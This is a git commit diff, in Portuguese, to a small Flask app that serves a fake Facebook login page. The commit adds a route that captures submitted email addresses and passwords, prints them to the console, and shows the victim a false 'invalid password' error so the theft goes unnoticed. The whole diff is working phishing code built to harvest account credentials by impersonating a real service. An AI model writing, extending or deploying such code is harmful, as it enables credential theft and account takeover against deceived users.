3a75fb75b9b09306d475430c14144d6411a23a6e
Gabriela <severogabriela4@gmail.com>
2024-06-17 16:17:30 -0300

    add: função recolhimento de dados

--- pag_falsa.py
+++ pag_falsa.py
@@ -6,4 +6,13 @@ app = Flask(__name__)
 def pagina_inicial():
     return render_template("facebook_falso.html")
 
+@app.route("/pega_dados", methods=["POST"])
+def pega_dados():
+    email = request.form.get("email")
+    senha = request.form.get("pass")
+    
+    print(f"EMAIL:{email} \n  SENHA:{senha}")
+
+    return "ERRO: senha inválida!"
+
 app.run()
